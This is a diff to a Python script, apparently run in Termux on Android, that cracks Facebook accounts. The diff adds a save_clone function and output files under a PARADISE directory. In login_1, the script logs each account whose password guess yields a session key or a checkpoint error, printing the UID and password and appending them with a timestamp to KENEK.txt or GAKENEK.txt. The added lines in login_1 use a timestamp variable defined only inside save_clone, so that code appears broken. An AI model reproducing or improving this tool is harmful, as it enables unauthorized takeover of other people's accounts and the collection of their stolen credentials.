@@ -18,6 +18,29 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from os import system
 from datetime import datetime
 
+BASE_DIR = "/data/data/com.termux/files/home/storage/shared/PARADISE"
+os.makedirs(BASE_DIR, exist_ok=True)
+
+def rainbow(text):
+    colors = ["\033[91m", "\033[93m", "\033[92m", "\033[96m", "\033[94m", "\033[95m"]
+    result = ""
+    for i, char in enumerate(text):
+        result += colors[i % len(colors)] + char
+    return result + "\033[0m"
+
+# ==========================
+def save_clone(uid, pw):
+    # Ambil tanggal & jam sekarang
+    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    # Nama file tetap sama (tidak pakai tanggal)
+    clone_filename = "CLONE.txt"
+    clone_path = os.path.join(BASE_DIR, clone_filename)
+
+    # Simpan data + waktu
+    with open(clone_path, "a") as f:
+        f.write(f"{uid}|{pw}|{waktu}\n")
+
 # Ensure required modules are installed
 modules = ['requests', 'urllib3', 'mechanize', 'rich']
 for module in modules:
@@ -543,22 +566,22 @@ def login_1(uid):
             ).json()
 
             if 'session_key' in res:
-                print("\033[93m───[ OK RESULT ]──────────────────\033[0m")
+                print("\033[95m───[ \033[97mOK RESULT\033[95m ]──────────────────\033[0m")
                 print(f"\033[93m🆔 : {uid}\033[0m")
                 print(f"\033[93m🔑 : {pw}\033[0m")
                 print(f"\033[93m📅 : {creationyear(uid)}\033[0m")
                 print("\033[93m──────────────────────────────────\033[0m")
-                open('/storage/emulated/0/juall.txt/jual.txt', 'a').write(f"{uid}|{pw}\n")
+                open(f"/data/data/com.termux/files/home/storage/shared/PARADISE/KENEK.txt", "a").write(f"{uid}|{pw}|{waktu}\n")
                 oks.append(uid)
                 break
 
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print("\033[93m───[ OK RESULT ]──────────────────\033[0m")
+                print("\033[35m───[ \033[97mOK RESULT\033[35m ]──────────────────\033[0m")
                 print(f"\033[93m🆔 : {uid}\033[0m")
                 print(f"\033[93m🔑 : {pw}\033[0m")
                 print(f"\033[93m📅 : {creationyear(uid)}\033[0m")
                 print("\033[93m──────────────────────────────────\033[0m")
-                open('/storage/emulated/0/jualll.txt/jual.txt', 'a').write(f"{uid}|{pw}\n")
+                open(f"/data/data/com.termux/files/home/storage/shared/PARADISE/GAKENEK.txt", "a").write(f"{uid}|{pw}|{waktu}\n")
                 oks.append(uid)
                 break
 
